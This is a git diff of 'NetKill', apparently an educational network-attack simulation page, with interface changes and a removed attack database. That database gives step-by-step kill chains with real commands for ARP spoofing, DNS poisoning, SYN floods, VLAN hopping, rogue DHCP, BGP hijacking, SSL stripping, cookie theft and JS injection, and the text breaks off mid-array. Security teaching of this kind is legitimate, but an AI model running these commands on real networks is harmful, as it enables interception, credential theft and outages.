-    <p>NetKill is a <strong>simulation and learning tool</strong>. All attack scenarios are visualized in a fictional lab environment. No real networks are scanned, probed, or affected.</p>
-    <p>Performing unauthorized network attacks is <strong>illegal</strong> under the Computer Fraud and Abuse Act (CFAA), India's IT Act 2000, and equivalent laws worldwide. Only perform security testing on systems you own or have explicit written permission to test.</p>
-    <p style="color:var(--amber)">This tool is built for GRC analysts, security students, and engineers to understand attack methodology — not to enable unauthorized access.</p>
-    <button class="modal-close" onclick="document.getElementById('disclaimerModal').classList.remove('active')">I UNDERSTAND — ENTER LAB</button>
+    <p>NetKill is a <strong>browser-based simulation tool</strong>. All scenarios run inside a fictional lab environment. No real networks are scanned, probed, or attacked in any way.</p>
+    <p>Performing unauthorized network attacks is <strong>illegal</strong> under the Computer Fraud and Abuse Act (CFAA), India's IT Act 2000, and equivalent laws worldwide.</p>
+    <p class="warn">Only test systems you own or have explicit written permission to test.</p>
+    <button class="modal-close" onclick="document.getElementById('modal').classList.remove('active')">ENTER THE LAB →</button>
   </div>
 </div>
 
-<!-- HEADER -->
 <header>
   <div class="header-inner">
     <div class="logo">
-      <div class="logo-icon">☠</div>
+      <div class="logo-skull">☠</div>
       <div class="logo-text">
         <h1>NETKILL</h1>
-        <span>Network Attack Lab // v1.0.0</span>
+        <p>NETWORK ATTACK LAB // v1.1.0</p>
       </div>
     </div>
     <div class="header-right">
-      <div class="status-badge">
-        <div class="status-dot"></div>
-        LAB ONLINE
-      </div>
-      <button class="disclaimer-btn" onclick="document.getElementById('disclaimerModal').classList.add('active')">⚠ LEGAL</button>
+      <div class="hbadge hbg"><span class="sdot"></span>LAB ONLINE</div>
+      <div class="hbadge hba" onclick="document.getElementById('modal').classList.add('active')">⚠ LEGAL</div>
     </div>
   </div>
 </header>
 
-<!-- MAIN -->
 <div class="main">
 
-  <!-- LEFT: ATTACK MENU -->
-  <div class="panel left-panel">
-    <div class="panel-header">
-      <div class="panel-dot"></div>
-      <h3>Attack Vectors</h3>
-    </div>
-    <div class="attack-list" id="attackList"></div>
+  <div class="panel">
+    <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Attack Vectors</h3></div>
+    <div class="attack-list" id="atkList"></div>
   </div>
 
-  <!-- CENTER -->
-  <div class="center-panel">
-
-    <!-- Network Canvas -->
-    <div class="panel canvas-panel">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>Network Topology — Lab Environment</h3>
+  <div class="center">
+    <div class="panel">
+      <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Network Topology — Lab Environment</h3></div>
+      <div class="canvas-wrap">
+        <canvas id="nc"></canvas>
+        <div class="cv-label" id="cvLabel">SELECT AN ATTACK TO BEGIN</div>
       </div>
-      <div class="net-canvas">
-        <canvas id="netCanvas"></canvas>
-        <div class="canvas-overlay" id="canvasLabel">SELECT AN ATTACK TO BEGIN</div>
-      </div>
-      <div class="lab-controls">
-        <button class="btn btn-primary" id="launchBtn" onclick="launchAttack()" disabled>⚡ LAUNCH ATTACK</button>
-        <button class="btn btn-secondary" onclick="resetLab()">↺ RESET</button>
-        <div class="attack-progress">
-          <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--text3)" id="progressLabel">0%</span>
+      <div class="lab-ctrl">
+        <button class="btn-launch" id="launchBtn" onclick="launchAttack()" disabled>⚡ LAUNCH ATTACK</button>
+        <button class="btn-reset" onclick="resetLab()">↺ RESET</button>
+        <div class="prog-bar"><div class="prog-fill" id="progFill"></div></div>
+        <span class="prog-pct" id="progPct">0%</span>
       </div>
     </div>
 
-    <!-- Kill Chain Steps -->
-    <div class="panel steps-panel" style="flex:1; overflow-y:auto;">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>Kill Chain — Step by Step</h3>
-      </div>
-      <div class="steps-container" id="stepsContainer">
-        <div class="welcome-screen">
-          <div class="welcome-arrow">←</div>
+    <div class="panel">
+      <div class="panel-header ph-green"><div class="pdot pd-g"></div><h3>Live Packet Forge</h3></div>
+      <div class="pkt-display" id="pktDisplay"><div class="pkt-empty">// Select an attack to see real packet structure</div></div>
+    </div>
+
+    <div class="panel" style="flex:1;overflow:hidden;display:flex;flex-direction:column;">
+      <div class="panel-header ph-orange"><div class="pdot pd-o"></div><h3>Kill Chain — Step by Step</h3></div>
+      <div class="chain-body" id="chainBody" style="flex:1;overflow-y:auto;">
+        <div class="welcome">
+          <div class="w-arrow">←</div>
           <h2>SELECT AN ATTACK</h2>
-          <p>Choose a network attack from the left panel to see the full attacker kill chain with real tools and commands.</p>
+          <p>Choose a network attack to see the full attacker kill chain with real commands.</p>
         </div>
       </div>
     </div>
-
   </div>
 
-  <!-- RIGHT -->
-  <div class="right-panel">
-
-    <!-- Scores -->
+  <div class="right">
     <div class="panel">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>Attack Metrics</h3>
-      </div>
+      <div class="panel-header ph-red"><div class="pdot pd-r"></div><h3>Attack Metrics</h3></div>
       <div class="score-grid">
-        <div class="score-card">
-          <div class="score-label">Impact</div>
-          <div class="score-val red" id="scoreImpact">—</div>
-        </div>
-        <div class="score-card">
-          <div class="score-label">Stealth</div>
-          <div class="score-val green" id="scoreStealth">—</div>
-        </div>
-        <div class="score-card">
-          <div class="score-label">Complexity</div>
-          <div class="score-val amber" id="scoreComplex">—</div>
-        </div>
-        <div class="score-card">
-          <div class="score-label">Layer</div>
-          <div class="score-val cyan" id="scoreLayer">—</div>
-        </div>
+        <div class="sc"><div class="sc-l">Impact</div><div class="sc-v red" id="sImpact">—</div></div>
+        <div class="sc"><div class="sc-l">Stealth</div><div class="sc-v green" id="sStealth">—</div></div>
+        <div class="sc"><div class="sc-l">Complexity</div><div class="sc-v amber" id="sComplex">—</div></div>
+        <div class="sc"><div class="sc-l">Layer</div><div class="sc-v cyan" id="sLayer">—</div></div>
       </div>
     </div>
-
-    <!-- MITRE ATT&CK -->
     <div class="panel">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>MITRE ATT&CK Mapping</h3>
-      </div>
-      <div class="mitre-box" id="mitreBox">
-        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--text3)">Select an attack to see MITRE mapping...</span>
-      </div>
+      <div class="panel-header ph-cyan"><div class="pdot pd-c"></div><h3>MITRE ATT&CK Mapping</h3></div>
+      <div class="mitre-body" id="mitreBody"><span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">Select an attack...</span></div>
     </div>
-
-    <!-- Attacker Tools -->
     <div class="panel">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>Attacker Toolkit</h3>
-      </div>
-      <div class="tool-list" id="toolList">
-        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--text3);padding:0.5rem 0;display:block">No attack selected...</span>
+      <div class="panel-header ph-amber"><div class="pdot pd-a"></div><h3>Attacker Toolkit</h3></div>
+      <div class="tool-body" id="toolBody"><span style="font-family:var(--mono);font-size:0.62rem;color:#1a1a1a">No attack selected...</span></div>
+    </div>
+    <div class="panel" style="flex:1">
+      <div class="panel-header ph-green"><div class="pdot pd-g"></div><h3>Detection Log</h3></div>
+      <div class="log-body" id="logBody">
+        <div class="log-e info">[SYS] Lab environment initialized</div>
+        <div class="log-e info">[SYS] All nodes nominal — awaiting simulation</div>
       </div>
     </div>
-
-    <!-- Detection Log -->
-    <div class="panel" style="flex:1;">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <h3>Detection Log</h3>
-      </div>
-      <div class="det-log" id="detLog">
-        <div class="log-entry info">[SYS] Lab environment initialized</div>
-        <div class="log-entry info">[SYS] All nodes nominal — awaiting attack simulation</div>
-      </div>
-    </div>
-
   </div>
+
 </div>
 
-<!-- BOTTOM BAR -->
-<div class="bottom-bar">
-  <span>NETKILL v1.0.0 · Offline-First · Zero Dependencies · Educational Use Only. © 2025 Irfan M</span>
-  <span class="legal">⚠ Unauthorized network attacks are illegal. This tool simulates only.</span>
+<footer>
+  <span>NETKILL v1.1.0 · Offline-First · Zero Dependencies · Educational Use Only. © 2025 Irfan M</span>
+  <span class="fl">⚠ Unauthorized network attacks are illegal. Simulation only.</span>
   <span>github.com/irfanm46/netkill</span>
-</div>
+</footer>
 
 <script>
-// ══════════════════════════════════════════════
-// ATTACK DATA — Full Database
-// ══════════════════════════════════════════════
-const ATTACKS = [
-  {
-    id: 'arp',
-    name: 'ARP Spoofing',
-    subtitle: 'Gateway Poisoning',
-    layer: 'L2',
-    impact: 9,
-    stealth: 7,
-    complexity: 'MED',
-    layerLabel: 'Data Link',
-    mitre: {
-      'Initial Access': ['T1200 — Hardware Additions'],
-      'Credential Access': ['T1557 — MITM', 'T1040 — Network Sniffing'],
-      'Collection': ['T1557.002 — ARP Cache Poisoning']
-    },
-    tools: [
-      { icon: '🐍', name: 'arpspoof', use: 'Classic ARP poisoning (dsniff)' },
-      { icon: '🦜', name: 'Ettercap', use: 'GUI MITM + sniffing suite' },
-      { icon: '🐉', name: 'Scapy', use: 'Custom ARP packet crafting' },
-      { icon: '🔥', name: 'Bettercap', use: 'Modern MITM framework' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — RECONNAISSANCE',
-        steps: [
-          { title: 'Network Discovery', desc: 'Identify live hosts, gateway IP, and victim IP on the local subnet.', cmd: 'nmap -sn 192.168.1.0/24' },
-          { title: 'ARP Table Inspection', desc: 'Check the current ARP cache to map IP→MAC relationships.', cmd: 'arp -a' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — WEAPONIZATION',
-        steps: [
-          { title: 'Enable IP Forwarding', desc: 'Tell your OS to forward packets so the victim stays connected (stealthy MITM).', cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward' },
-          { title: 'Craft Poison Packets', desc: 'Forge ARP replies telling victim: "I am the gateway" and gateway: "I am the victim".', cmd: '' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — EXPLOITATION',
-        steps: [
-          { title: 'Launch ARP Poison', desc: 'Continuously send forged ARP replies to victim and gateway to maintain poisoned caches.', cmd: 'arpspoof -i eth0 -t 192.168.1.45 192.168.1.1\narpspoof -i eth0 -t 192.168.1.1 192.168.1.45' },
-          { title: 'Intercept Traffic', desc: 'All victim traffic now flows through your machine. Capture with Wireshark or tcpdump.', cmd: 'tcpdump -i eth0 -w capture.pcap host 192.168.1.45' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — POST-EXPLOITATION',
-        steps: [
-          { title: 'Credential Harvest', desc: 'Analyze capture for cleartext credentials (HTTP, FTP, Telnet, plain SMTP).', cmd: 'ettercap -T -r capture.pcap' },
-          { title: 'SSL Strip (Advanced)', desc: 'Downgrade HTTPS → HTTP to capture encrypted sessions in plaintext.', cmd: 'bettercap -iface eth0 -eval "net.probe on; arp.spoof on; http.proxy on"' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'warn', msg: '[ARP] Duplicate IP detected: 192.168.1.1 has 2 MAC addresses' },
-      { type: 'alert', msg: '[IDS] ARP storm detected — 847 ARP replies in 3s from 192.168.1.99' },
-      { type: 'warn', msg: '[NET] Gateway MAC changed: aa:bb:cc → de:ad:be:ef' },
-      { type: 'alert', msg: '[SOC] Possible MITM — traffic routing anomaly detected' },
-    ],
-    nodes: ['attacker', 'victim', 'gateway', 'internet'],
-    attackFlow: 'arp'
-  },
-  {
-    id: 'dns',
-    name: 'DNS Poisoning',
-    subtitle: 'Cache Injection',
-    layer: 'L7',
-    impact: 8,
-    stealth: 9,
-    complexity: 'HIGH',
-    layerLabel: 'Application',
-    mitre: {
-      'Initial Access': ['T1189 — Drive-by Compromise'],
-      'Defense Evasion': ['T1557 — MITM'],
-      'Collection': ['T1040 — Network Sniffing', 'T1185 — Browser Session Hijack']
-    },
-    tools: [
-      { icon: '🎭', name: 'dnsspoof', use: 'DNS response spoofing' },
-      { icon: '🔥', name: 'Bettercap', use: 'DNS spoof module' },
-      { icon: '🐍', name: 'Scapy', use: 'Custom DNS packet crafting' },
-      { icon: '👹', name: 'Responder', use: 'LLMNR/NBT-NS/DNS poisoning' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — POSITIONING',
-        steps: [
-          { title: 'Achieve MITM Position', desc: 'DNS poisoning requires intercepting DNS queries. First establish ARP MITM or be on-path.', cmd: 'bettercap -iface eth0 -eval "arp.spoof on"' },
-          { title: 'Identify DNS Server', desc: 'Find what DNS server the victim queries — usually the gateway or ISP resolver.', cmd: 'cat /etc/resolv.conf\nnmap -sU -p53 192.168.1.1' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — SPOOF SETUP',
-        steps: [
-          { title: 'Create Fake DNS Entries', desc: 'Map target domains to your malicious IP in a hosts-style config file.', cmd: '# hosts.txt\n192.168.1.99  bank.com\n192.168.1.99  mail.google.com' },
-          { title: 'Deploy Fake Web Server', desc: 'Stand up a cloned site at your IP to capture credentials from redirected victims.', cmd: 'python3 -m http.server 80' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — INJECTION',
-        steps: [
-          { title: 'Intercept DNS Queries', desc: 'Watch for DNS queries from the victim. Race the legitimate resolver — reply first with forged answer.', cmd: 'dnsspoof -i eth0 -f hosts.txt' },
-          { title: 'Poison Resolver Cache', desc: 'If targeting the DNS server directly, inject forged records into its cache (Kaminsky Attack).', cmd: 'bettercap -eval "dns.spoof.domains bank.com; dns.spoof on"' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — HARVEST',
-        steps: [
-          { title: 'Credential Capture', desc: 'Victims browse to your cloned site believing it is legitimate. Capture POST data.', cmd: 'tcpdump -i eth0 port 80 -A | grep -i "POST\\|password"' },
-          { title: 'Persistence', desc: 'DNS cache poisoning persists until TTL expires. Victim keeps hitting your server.', cmd: '' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'info', msg: '[DNS] Query: victim → bank.com (type A)' },
-      { type: 'alert', msg: '[DNS] Spoofed response detected: bank.com → 192.168.1.99 (not 13.225.x.x)' },
-      { type: 'warn', msg: '[IDS] DNS answer arrived BEFORE query reached resolver' },
-      { type: 'alert', msg: '[SOC] DNS cache poisoning signature — Kaminsky variant' },
-    ],
-    nodes: ['attacker', 'victim', 'dns', 'internet'],
-    attackFlow: 'dns'
-  },
-  {
-    id: 'syn',
-    name: 'SYN Flood',
-    subtitle: 'TCP DoS Attack',
-    layer: 'L4',
-    impact: 10,
-    stealth: 3,
-    complexity: 'LOW',
-    layerLabel: 'Transport',
-    mitre: {
-      'Impact': ['T1498 — Network DoS', 'T1498.001 — Direct Network Flood'],
-      'Resource Dev': ['T1583 — Acquire Infrastructure']
-    },
-    tools: [
-      { icon: '💥', name: 'hping3', use: 'SYN flood with IP spoofing' },
-      { icon: '🌊', name: 'scapy', use: 'Custom TCP SYN packet flood' },
-      { icon: '⚡', name: 'LOIC', use: 'Low Orbit Ion Cannon (DoS)' },
-      { icon: '🤖', name: 'Botnet', use: 'Distributed SYN flood (DDoS)' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — TARGET ANALYSIS',
-        steps: [
-          { title: 'Identify Target Service', desc: 'Find open TCP ports — web server (80/443), SSH (22), or custom services to flood.', cmd: 'nmap -sS -p 80,443,22 192.0.2.100' },
-          { title: 'Measure Baseline Capacity', desc: 'Estimate target connection queue size (backlog). Default Linux = 128 connections.', cmd: 'ss -lnt | grep :80' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — SPOOFING SETUP',
-        steps: [
-          { title: 'Spoof Source IPs', desc: 'Use random/spoofed source IPs so SYN-ACK replies go nowhere — target waits forever.', cmd: '' },
-          { title: 'Configure Packet Rate', desc: 'Set flood rate high enough to exhaust the connection table before half-open entries expire.', cmd: '' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — FLOOD LAUNCH',
-        steps: [
-          { title: 'Launch SYN Flood', desc: 'Send millions of SYN packets with spoofed IPs. Target responds with SYN-ACK to nobody. Connection table fills up. Legitimate users cannot connect.', cmd: 'hping3 -S --flood -V -p 80 --rand-source 192.0.2.100' },
-          { title: 'Amplify via Reflectors', desc: 'Use open TCP servers as reflectors — spoof victim IP, flood reflector, victim gets SYN-ACK storm.', cmd: '' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — IMPACT',
-        steps: [
-          { title: 'Service Unavailable', desc: 'Target server cannot accept new connections. Legitimate traffic is dropped. 100% CPU on SYN processing.', cmd: 'ss -s  # Watch established/timewait explode' },
-          { title: 'Cover Tracks', desc: 'Spoofed IPs make attribution extremely difficult. Attack traffic looks like random global IPs.', cmd: '' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'alert', msg: '[NET] Anomaly: 50,000 SYN packets/sec to port 80' },
-      { type: 'alert', msg: '[FW] Connection table 98% full — dropping new connections' },
-      { type: 'warn', msg: '[SYS] TCP backlog overflow — service degraded' },
-      { type: 'alert', msg: '[SOC] DDoS signature: SYN flood from 10,000+ source IPs' },
-    ],
-    nodes: ['attacker', 'internet', 'target', 'botnet'],
-    attackFlow: 'syn'
-  },
-  {
-    id: 'vlan',
-    name: 'VLAN Hopping',
-    subtitle: 'Switch Exploitation',
-    layer: 'L2',
-    impact: 8,
-    stealth: 9,
-    complexity: 'HIGH',
-    layerLabel: 'Data Link',
-    mitre: {
-      'Lateral Movement': ['T1599 — Network Boundary Bridging', 'T1599.001 — Network Address Translation Traversal'],
-      'Discovery': ['T1046 — Network Service Discovery']
-    },
-    tools: [
-      { icon: '🦎', name: 'Yersinia', use: 'Layer 2 protocol attacks (DTP/STP)' },
-      { icon: '🐍', name: 'Scapy', use: 'Double-tagged 802.1Q frames' },
-      { icon: '🔧', name: 'frogger.py', use: 'VLAN hopping toolkit' },
-      { icon: '📡', name: 'Wireshark', use: 'Capture cross-VLAN traffic' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — SWITCH ENUMERATION',
-        steps: [
-          { title: 'Find Trunk Ports', desc: 'Look for switches running DTP (Dynamic Trunking Protocol) — many Cisco switches have DTP enabled by default.', cmd: 'yersinia dtp -attack 1  # Send DTP frames to detect trunk' },
-          { title: 'Identify Target VLAN', desc: 'Determine which VLAN holds sensitive assets (e.g. VLAN 10 = servers, VLAN 20 = guest).', cmd: 'nmap --script=broadcast-listener -e eth0' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — SWITCH SPOOFING',
-        steps: [
-          { title: 'Negotiate Trunk Link', desc: 'Send DTP negotiate frames to convince the switch your attacker port is another switch trunk.', cmd: 'yersinia dtp -attack 3  # DTP trunking negotiation' },
-          { title: 'Become a Trunk', desc: 'Once trunk is established, your NIC receives traffic from ALL VLANs — complete VLAN visibility.', cmd: 'ip link add link eth0 name eth0.10 type vlan id 10\nip link set eth0.10 up' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — DOUBLE TAGGING',
-        steps: [
-          { title: 'Double-Tag Frames', desc: 'Alternative method: craft frames with two 802.1Q tags. First switch strips outer tag (your VLAN), inner tag carries frame to target VLAN.', cmd: "scapy: Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst='10.0.10.50')/ICMP()" },
-          { title: 'Access Target VLAN', desc: 'Frames now reach hosts in the target VLAN. Note: this is one-way — replies need full trunk for bidirectional access.', cmd: '' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — PIVOT',
-        steps: [
-          { title: 'Lateral Movement', desc: 'From the target VLAN, attack servers, pivot further, or capture credentials from previously isolated network segment.', cmd: 'nmap -sV 10.0.10.0/24  # Discover hosts in target VLAN' },
-          { title: 'Bypass Segmentation', desc: 'VLAN segmentation (often seen as security) is defeated. Attacker accesses "isolated" finance/server VLANs from guest network.', cmd: '' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'warn', msg: '[SW] Unexpected DTP frame from port Gi0/12 — not a trunk port' },
-      { type: 'alert', msg: '[SW] Double-tagged 802.1Q frame detected on access port' },
-      { type: 'info', msg: '[NET] New trunk link negotiated on port Gi0/12 — investigate' },
-      { type: 'alert', msg: '[SOC] VLAN hopping attempt — cross-VLAN traffic anomaly' },
-    ],
-    nodes: ['attacker', 'switch', 'vlan10', 'vlan20'],
-    attackFlow: 'vlan'
-  },
-  {
-    id: 'dhcp',
-    name: 'DHCP Starvation',
-    subtitle: 'Rogue Server Setup',
-    layer: 'L2',
-    impact: 7,
-    stealth: 6,
-    complexity: 'LOW',
-    layerLabel: 'Data Link',
-    mitre: {
-      'Initial Access': ['T1200 — Hardware Additions'],
-      'Impact': ['T1498 — Network DoS'],
-      'Collection': ['T1557 — MITM via Rogue DHCP']
-    },
-    tools: [
-      { icon: '🦴', name: 'Yersinia', use: 'DHCP starvation attack' },
-      { icon: '🐍', name: 'dhcpstarv', use: 'DHCP pool exhaustion' },
-      { icon: '🏚', name: 'isc-dhcp-server', use: 'Setup rogue DHCP server' },
-      { icon: '🔥', name: 'Metasploit', use: 'auxiliary/server/dhcp' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — STARVATION',
-        steps: [
-          { title: 'Exhaust DHCP Pool', desc: 'Flood DHCP server with DISCOVER requests using random spoofed MAC addresses. Server assigns IPs until pool is exhausted.', cmd: 'yersinia dhcp -attack 1  # DHCP starvation\n# OR\ndhcpstarv -i eth0' },
-          { title: 'Verify Pool Exhaustion', desc: 'Once pool is full, legitimate clients cannot get an IP. Network access denied = DoS.', cmd: 'nmap --script broadcast-dhcp-discover' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — ROGUE SERVER',
-        steps: [
-          { title: 'Start Rogue DHCP Server', desc: 'Stand up your own DHCP server offering IPs with your machine as the default gateway and DNS server.', cmd: '# /etc/dhcp/dhcpd.conf\nsubnet 192.168.1.0 netmask 255.255.255.0 {\n  range 192.168.1.200 192.168.1.250;\n  option routers 192.168.1.99;       # Attacker\n  option domain-name-servers 192.168.1.99; # Attacker DNS\n}' },
-          { title: 'Enable IP Forwarding', desc: 'Forward all traffic so victims stay connected while you inspect everything.', cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward\nservice isc-dhcp-server start' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — VICTIMS CONNECT',
-        steps: [
-          { title: 'Victims Accept Rogue Lease', desc: 'New/reconnecting devices send DISCOVER → your rogue server responds first → victim uses your gateway and DNS.', cmd: '' },
-          { title: 'Full Traffic Intercept', desc: 'All victim traffic flows through you as gateway. DNS queries come to you as resolver.', cmd: 'tcpdump -i eth0 -w rogue_capture.pcap' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — COMBINED ATTACK',
-        steps: [
-          { title: 'DNS Poisoning via Rogue DNS', desc: 'Since victims use your DNS server, you can resolve any domain to any IP — perfect phishing infrastructure.', cmd: 'bettercap -eval "dns.spoof.domains *; dns.spoof on"' },
-          { title: 'SSL Stripping', desc: 'Intercept HTTPS upgrades, downgrade to HTTP, harvest credentials in cleartext.', cmd: '' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'alert', msg: '[DHCP] Pool exhaustion: 254/254 leases consumed in 8 seconds' },
-      { type: 'alert', msg: '[DHCP] Rogue DHCP server detected: 192.168.1.99 offering leases' },
-      { type: 'warn', msg: '[NET] Gateway MAC changed for 12 clients simultaneously' },
-      { type: 'stealth', msg: '[SOC] Rogue DHCP: clients received attacker as default GW/DNS' },
-    ],
-    nodes: ['attacker', 'victim', 'gateway', 'dhcp'],
-    attackFlow: 'dhcp'
-  },
-  {
-    id: 'bgp',
-    name: 'BGP Hijacking',
-    subtitle: 'Route Injection',
-    layer: 'L3',
-    impact: 10,
-    stealth: 8,
-    complexity: 'HIGH',
-    layerLabel: 'Network',
-    mitre: {
-      'Initial Access': ['T1590 — Gather Victim Network Info'],
-      'Impact': ['T1498 — Network DoS', 'T1565 — Data Manipulation'],
-      'Collection': ['T1040 — Network Sniffing at Internet Scale']
-    },
-    tools: [
-      { icon: '🌐', name: 'BIRD', use: 'BGP daemon for route injection' },
-      { icon: '🦓', name: 'Quagga/FRRouting', use: 'Open source BGP router' },
-      { icon: '📡', name: 'ExaBGP', use: 'BGP announcement tool' },
-      { icon: '🔍', name: 'BGPmon', use: 'BGP monitoring and analysis' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — INTELLIGENCE',
-        steps: [
-          { title: 'Identify Target ASN', desc: 'Find the Autonomous System Number (ASN) and IP prefixes of the target organization using WHOIS and BGP looking glasses.', cmd: 'whois -h whois.radb.net 8.8.8.0/24\nbgpmon.net lookup AS15169  # Google example' },
-          { title: 'Find Upstream Peers', desc: 'Map which ISPs peer with the target AS. These are your injection points.', cmd: 'traceroute 8.8.8.8  # Map AS hops\nbgp.he.net  # AS visualization' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — ROUTE INJECTION',
-        steps: [
-          { title: 'Announce More-Specific Prefix', desc: 'BGP prefers more specific routes. Announce a /25 from your AS while target announces /24. Some traffic will route to you.', cmd: '# exabgp config\nneighbor 203.0.113.1 {\n  local-as 65001;\n  peer-as 65002;\n  announce 8.8.8.0/25 next-hop self;\n}' },
-          { title: 'Propagation', desc: 'Routers prefer your more-specific route. Traffic meant for 8.8.8.0/25 now routes to your AS instead of target.', cmd: '' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — INTERCEPTION',
-        steps: [
-          { title: 'Intercept Traffic', desc: 'Traffic for the target prefix arrives at your router. You can inspect, manipulate, or black-hole it.', cmd: 'tcpdump -i eth0 net 8.8.8.0/25' },
-          { title: 'Transparent Forward', desc: 'For stealthy MITM: forward traffic to real destination after inspection. Victims never know.', cmd: 'ip route add 8.8.8.0/25 via <real-next-hop>' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — IMPACT',
-        steps: [
-          { title: 'Nation-State Scale Attack', desc: 'Real BGP hijacks have rerouted traffic from major banks, crypto exchanges, and governments. 2018 Amazon Route 53 hijack stole $150K in crypto.', cmd: '' },
-          { title: 'Black-Hole (DoS)', desc: 'Announce the prefix but drop all traffic. Entire IP range goes dark for affected regions.', cmd: 'ip route add 8.8.8.0/25 via blackhole' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'warn', msg: '[BGP] New route announcement: 8.8.8.0/25 from AS65001 (unexpected)' },
-      { type: 'alert', msg: '[BGP] Prefix hijack detected: more-specific /25 overrides /24' },
-      { type: 'alert', msg: '[NOC] Traffic to 8.8.8.0/25 rerouted through AS65001 (unrecognized)' },
-      { type: 'warn', msg: '[RPKI] Route origin validation FAILED for 8.8.8.0/25' },
-    ],
-    nodes: ['attacker', 'isp1', 'isp2', 'internet'],
-    attackFlow: 'bgp'
-  },
-  {
-    id: 'mitm',
-    name: 'Full MITM',
-    subtitle: 'Complete Interception',
-    layer: 'L2-L7',
-    impact: 10,
-    stealth: 6,
-    complexity: 'HIGH',
-    layerLabel: 'All Layers',
-    mitre: {
-      'Credential Access': ['T1557 — Adversary-in-the-Middle', 'T1040 — Network Sniffing'],
-      'Collection': ['T1185 — Browser Session Hijacking'],
-      'Defense Evasion': ['T1553 — Subvert Trust Controls (SSL Strip)']
-    },
-    tools: [
-      { icon: '🔥', name: 'Bettercap', use: 'All-in-one MITM framework' },
-      { icon: '🦜', name: 'Ettercap', use: 'Classic MITM + plugins' },
-      { icon: '🕷', name: 'MITMproxy', use: 'HTTP/S interception proxy' },
-      { icon: '🔐', name: 'SSLstrip', use: 'HTTPS→HTTP downgrade' },
-    ],
-    phases: [
-      {
-        label: 'PHASE 1 — POSITION',
-        steps: [
-          { title: 'ARP + DHCP Poisoning', desc: 'Combine ARP spoofing with rogue DHCP to ensure ALL traffic on subnet routes through attacker machine.', cmd: 'bettercap -iface eth0 -eval "arp.spoof on; net.probe on"' },
-          { title: 'Enable Forwarding', desc: 'Maintain victim connectivity while intercepting — stealth MITM.', cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080' },
-        ]
-      },
-      {
-        label: 'PHASE 2 — SSL ATTACK',
-        steps: [
-          { title: 'SSL Strip', desc: 'Intercept HTTPS redirects and downgrade to HTTP. Victim browses HTTP while thinking HTTPS. Attacker sees plaintext.', cmd: 'bettercap -eval "http.proxy on; https.proxy on; hstshijack/hstshijack"' },
-          { title: 'SSL Sniff', desc: 'For apps that enforce HTTPS, capture the TLS handshake — extract session keys if browser exports them.', cmd: 'SSLKEYLOGFILE=/tmp/keys.log firefox &\nwireshark -o ssl.keylog_file:/tmp/keys.log' },
-        ]
-      },
-      {
-        label: 'PHASE 3 — DATA HARVEST',
-        steps: [
-          { title: 'Credential Sniffer', desc: 'Bettercap automatically extracts credentials from HTTP POST forms, FTP, Telnet, IMAP, POP3.', cmd: 'bettercap -eval "net.sniff on; net.sniff.verbose true"' },
-          { title: 'Cookie Theft / Session Hijack', desc: 'Steal authenticated session cookies. Replay them in your browser to hijack active sessions without knowing password.', cmd: 'bettercap -caplet http-req-dump.cap' },
-        ]
-      },
-      {
-        label: 'PHASE 4 — INJECTION',
-        steps: [
-          { title: 'JavaScript Injection', desc: 'Inject malicious JS into HTTP responses. Execute keyloggers, crypto miners, or BeEF hooks in victim browser.', cmd: 'bettercap -eval "inject.js on; set inject.js.src /evil.js"' },
-          { title: 'Persistence & Pivot', desc: 'Use harvested credentials to log into internal systems. Establish persistent access via SSH keys or VPN credentials.', cmd: '' },
-        ]
-      },
-    ],
-    detectionLogs: [
-      { type: 'alert', msg: '[TLS] Certificate mismatch detected for bank.com — possible MITM' },
-      { type: 'warn', msg: '[HSTS] HSTS bypass attempt detected on mail.google.com' },
-      { type: 'alert', msg: '[IDS] Suspicious ARP + HTTP proxy combination from 192.168.1.99' },
-      { type: 'alert', msg: '[SOC] MITM indicators: ARP spoof + SSL strip + credential harvest pattern' },
-    ],
